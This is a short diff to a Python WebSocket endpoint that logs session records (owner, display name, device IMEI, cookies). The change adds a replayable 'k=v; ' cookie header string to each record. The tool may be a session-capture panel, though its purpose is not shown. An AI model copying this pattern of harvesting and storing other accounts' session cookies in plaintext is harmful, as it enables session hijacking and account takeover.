@@ -437,14 +437,16 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
         now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
         name = user.get("displayName", "N/A") or "N/A"
+        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
 
         record = {
-            "id":      session_id[:8],
-            "owner":   username,
-            "name":    name,
-            "imei":    imei,
-            "cookies": cookies,
-            "time":    now,
+            "id":         session_id[:8],
+            "owner":      username,
+            "name":       name,
+            "imei":       imei,
+            "cookies":    cookies,
+            "cookie_str": cookie_str,
+            "time":       now,
         }
         add_history(record)
 
